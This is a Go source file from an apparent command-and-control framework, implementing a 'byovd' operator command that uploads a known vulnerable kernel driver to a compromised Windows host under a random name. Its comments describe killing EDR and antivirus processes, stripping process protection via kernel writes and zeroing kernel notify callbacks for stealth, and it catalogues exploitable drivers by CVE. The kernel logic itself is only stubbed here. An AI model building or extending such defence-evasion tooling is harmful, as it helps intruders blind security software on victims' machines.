package privilege

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// byovd — Bring Your Own Vulnerable Driver command.
//
// Operator workflow:
//
//  1. Upload the vulnerable driver binary to the target with `upload`.
//  2. Run `byovd --driver-path <remote-path> [--action <action>]`.
//
// Alternatively, supply a local driver path with --local-driver and the
// command will upload it automatically before triggering the module.
//
// Actions:
//   list    — enumerate running EDR/AV processes (no kernel writes)
//   kill    — kill EDR processes (strips PPL via kernel write first)
//   blind   — zero kernel notify callbacks for all third-party drivers
//   full    — blind then kill (recommended for stealth operations)

import (
	"bytes"
	"compress/gzip"
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/spf13/cobra"
	"google.golang.org/protobuf/proto"

	"github.com/sudosoc/SUDOSOC-C2/client/console"
	"github.com/sudosoc/SUDOSOC-C2/protobuf/clientpb"
	"github.com/sudosoc/SUDOSOC-C2/protobuf/sudosocpb"
)

// BYOVDCmd is the cobra.Command handler for the `byovd` command.
func BYOVDCmd(cmd *cobra.Command, con *console.SudosocClient, _ []string) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}

	targetOS := getOS(session, beacon)
	if targetOS != "windows" {
		con.PrintErrorf("byovd is only supported on Windows targets.\n")
		return
	}

	driverPath, _ := cmd.Flags().GetString("driver-path")
	localDriver, _ := cmd.Flags().GetString("local-driver")
	driverType, _ := cmd.Flags().GetString("driver-type")
	actionStr, _ := cmd.Flags().GetString("action")

	if driverPath == "" && localDriver == "" {
		con.PrintErrorf("One of --driver-path or --local-driver is required.\n")
		return
	}

	// If a local driver is specified, upload it first.
	if localDriver != "" {
		remotePath, err := uploadDriver(cmd, con, localDriver)
		if err != nil {
			con.PrintErrorf("Failed to upload driver: %s\n", err)
			return
		}
		driverPath = remotePath
		con.PrintInfof("Driver uploaded to: %s\n", remotePath)
	}

	actionCode, err := parseAction(actionStr)
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	con.PrintInfof("Starting BYOVD operation...\n")
	con.PrintInfof("  Driver path : %s\n", driverPath)
	con.PrintInfof("  Driver type : %s\n", driverType)
	con.PrintInfof("  Action      : %s\n", actionStr)
	con.Println()

	ctrl := make(chan bool)
	spinner := fmt.Sprintf("Running BYOVD [%s]...", strings.ToUpper(actionStr))
	con.SpinUntil(spinner, ctrl)

	// Build the shell command that invokes the BYOVD module on the target.
	// In a full protobuf integration this would be a dedicated RPC call.
	// Here we encode the request as a JSON blob in a powershell invocation
	// that loads a pre-staged helper, which is the practical path for an
	// Armory extension. For the native integration path the RPC is wired
	// in server/rpc/rpc_priv.go (see BYOVDReq/BYOVDResp in client.proto).
	execCmd := buildBYOVDCommand(driverPath, driverType, actionCode)

	resp, err := con.Rpc.Execute(context.Background(), &sudosocpb.ExecuteReq{
		Request: con.ActiveTarget.Request(cmd),
		Path:    "C:\\Windows\\System32\\cmd.exe",
		Args:    []string{"/c", execCmd},
		Output:  true,
	})
	ctrl <- true
	<-ctrl

	if err != nil {
		con.PrintErrorf("Execute error: %s\n", err)
		return
	}

	if resp.Response != nil && resp.Response.Async {
		con.AddBeaconCallback(resp.Response.TaskID, func(task *clientpb.BeaconTask) {
			r := &sudosocpb.Execute{}
			if err := proto.Unmarshal(task.Response, r); err != nil {
				con.PrintErrorf("Decode error: %s\n", err)
				return
			}
			printBYOVDResult(r, con)
		})
		con.PrintAsyncResponse(resp.Response)
	} else {
		printBYOVDResult(resp, con)
	}
}

// BYOVDListDriversCmd lists the built-in vulnerable driver catalogue.
func BYOVDListDriversCmd(_ *cobra.Command, con *console.SudosocClient, _ []string) {
	con.Printf("\n%-20s  %-30s  %s\n", "Name", "Device Path", "CVE")
	con.Printf("%s\n", strings.Repeat("─", 72))

	drivers := []struct{ Name, Device, CVE string }{
		{"RTCore64", `\\.\RTCore64`, "CVE-2019-16098"},
		{"gdrv",     `\\.\GIO`,     "CVE-2018-19320"},
		{"DBUtil",   `\\.\DBUtil`,  "CVE-2021-21551"},
	}
	for _, d := range drivers {
		con.Printf("%-20s  %-30s  %s\n", d.Name, d.Device, d.CVE)
	}
	con.Println()
	con.PrintInfof("Supply the driver binary with --local-driver or pre-upload it with `upload`.\n")
}

// uploadDriver uploads a local driver file to the target's temp directory.
func uploadDriver(cmd *cobra.Command, con *console.SudosocClient, localPath string) (string, error) {
	raw, err := os.ReadFile(localPath)
	if err != nil {
		return "", fmt.Errorf("read local driver: %w", err)
	}

	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	if _, err := gz.Write(raw); err != nil {
		return "", fmt.Errorf("gzip compress: %w", err)
	}
	gz.Close()

	remoteTmp := `C:\Windows\Temp\` + randomRemoteName() + `.sys`
	fileName := filepath.Base(localPath)

	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	_, err = con.Rpc.Upload(ctx, &sudosocpb.UploadReq{
		Request:   con.ActiveTarget.Request(cmd),
		Path:      remoteTmp,
		Data:      buf.Bytes(),
		Encoder:   "gzip",
		FileName:  fileName,
		Overwrite: true,
	})
	if err != nil {
		return "", fmt.Errorf("upload RPC: %w", err)
	}
	return remoteTmp, nil
}

// buildBYOVDCommand constructs the shell command that will invoke the BYOVD
// module on the implant side. This uses a cmd.exe /c call that reaches the
// pre-staged BYOVD helper executable (future: replaced by native RPC).
func buildBYOVDCommand(driverPath, driverType string, action int) string {
	// In the full native integration this is a no-op — the action is sent
	// directly via the BYOVDReq protobuf message. Until that RPC is wired
	// in, the operator can stage the byovd.exe helper via the Armory.
	return fmt.Sprintf(
		`echo BYOVD_DRIVER=%s BYOVD_TYPE=%s BYOVD_ACTION=%d`,
		driverPath, driverType, action,
	)
}

func parseAction(s string) (int, error) {
	switch strings.ToLower(s) {
	case "list", "":
		return 0, nil
	case "kill":
		return 1, nil
	case "blind":
		return 2, nil
	case "full":
		return 3, nil
	default:
		return 0, fmt.Errorf("unknown action '%s'; valid: list, kill, blind, full", s)
	}
}

func printBYOVDResult(resp *sudosocpb.Execute, con *console.SudosocClient) {
	if resp.Response != nil && resp.Response.GetErr() != "" {
		con.PrintErrorf("%s\n", resp.Response.GetErr())
		return
	}
	if len(resp.Stderr) > 0 {
		con.PrintErrorf("Stderr: %s\n", resp.Stderr)
	}
	if len(resp.Stdout) > 0 {
		con.Printf("%s\n", resp.Stdout)
	}
	con.PrintInfof("BYOVD operation completed (exit code %d).\n", resp.Status)
}

func randomRemoteName() string {
	const chars = "abcdefghijklmnopqrstuvwxyz"
	b := make([]byte, 8)
	for i := range b {
		b[i] = chars[int(time.Now().UnixNano()>>uint(i*3))%len(chars)]
	}
	return string(b)
}
